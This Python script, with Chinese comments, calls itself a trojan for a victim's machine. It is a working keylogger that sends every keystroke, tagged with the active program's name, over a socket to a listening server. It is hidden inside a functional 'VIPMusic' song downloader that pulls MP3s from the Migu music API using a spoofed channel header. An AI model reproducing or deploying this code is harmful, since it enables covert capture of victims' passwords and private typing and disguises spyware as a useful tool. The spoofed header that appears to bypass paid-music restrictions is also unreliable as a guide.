# 木马 运行在受害者的电脑上
from socket import *
import keyboard,psutil,win32gui,win32process,threading

# 木马申请连接后台
s = socket()  # 准备一个虚拟网络设备s
s.connect(('127.0.0.1', 9527))
last_pname = '' # 上一个进程名称

# 自定义函数
def on_press_key(event):
    global last_pname
    wnd = win32gui.GetForegroundWindow()  # 获取窗口id
    _, pid = win32process.GetWindowThreadProcessId(wnd)
    pname = psutil.Process(pid).name()
    if pname != last_pname:
        s.send(f'\n【正在操作{pname}】：\n'.encode())
        last_pname = pname
    if len(event.name) == 1:
        s.send(event.name.encode())
    else:
        s.send(f'[{event.name}]'.encode())
# 1.做什么
def send_key_logs():
    # 记录操作
    keyboard.on_press(on_press_key)  # 回调，使用我定义的函数功能
    keyboard.wait()  # 循环检测
# 2. 谁做
thread1 = threading.Thread(target=send_key_logs)
# 3. 什么时候做
thread1.start()
import os.path
import requests
while True:
# 用主要功能包装木马
    if not os.path.exists('VIPMusic'):
        os.makedirs('VIPMusic')
    while True:
        # 输入关键词，获取歌曲列表（歌曲名，歌手名，版权号，内容号等）
        while True:
            text = input('请搜索歌曲关键词：').strip()
            if text:
                break
            else:
                print('输入词后再回车。')
            # text=%E5%85%A8%E6%98%AF%E7%88%B1  =  text = 全是爱  得到一系列歌曲列表
        url2 = (
            f'https://c.musicapp.migu.cn/v1.0/content/search_all.do?text={text}&pageNo=1&pageSize=20&isCopyright=1&sort=1&searchSwitch=%7B%22song%22%3A1%2C%22album%22%3A0%2C%22singer'
            '%22%3A0%2C%22tagSong%22%3A1%2C%22mvSong%22%3A0%2C%22bestShow%22%3A1%7D')
        res2 = requests.get(url2)  # 从这个响应中得到3个ID  (后面发现专辑ID不需要)
        JSON = res2.json()
        # 得到搜索歌曲的列表
        song_list = JSON['songResultData']['result']
        song_dict = {}
        list1 = []
        for index, song in enumerate(song_list, start=1):
            song_name = song['name']
            try:
                singer_name = song['singers'][0]['name']
            except:
                singer_name = '未知'
            song_dict[index] = song
            list1.append([song_name, singer_name, song_list[index - 1]['copyrightId'], song_list[index - 1]['contentId']])
            print(index, song_name, singer_name)
        while True:
            number = input('请输入你要下载歌曲的序号(按0重新搜索)：')
            if number == '0':
                number = ''
                break
            if number.isdigit():
                number = int(number)
                if number in song_dict:
                    break
                else:
                    print('序号无效。')
            else:
                print('请输入数字。')
        if number:
            # 请求这个链接可以得到歌曲的下载链接  这个链接怎么来？ 再往上找几个, 链接所给的响应为ID号
            url1 = 'https://c.musicapp.migu.cn/MIGUM3.0/strategy/listen-url/v2.3?' \
                   f'copyrightId={song_list[number - 1]['copyrightId']}&contentId={song_list[number - 1]['contentId']}&resourceType=2&albumId=&netType=01&toneFlag=PQ'
            headers = {'channel': '0140210'}  # 伪装获取渠道
            res1 = requests.get(url1, headers=headers)
            # print(res1.text) # 得到了下载歌曲的链接 （json数据）
            # 从得到的res1里面提取的url放到下面
            JSON = res1.json()
            # 下载歌曲，必须要得到下载网址，下载链接怎么来？前面的抓包文件中响应有
            url = JSON['data']['url']
            res = requests.get(url)
            open(f'VIPMusic/{list1[number - 1][0]}-{list1[number - 1][1]}.mp3', 'wb').write(res.content)
            print(f'{list1[number - 1][0]}-{list1[number - 1][1]}.mp3下载成功~')
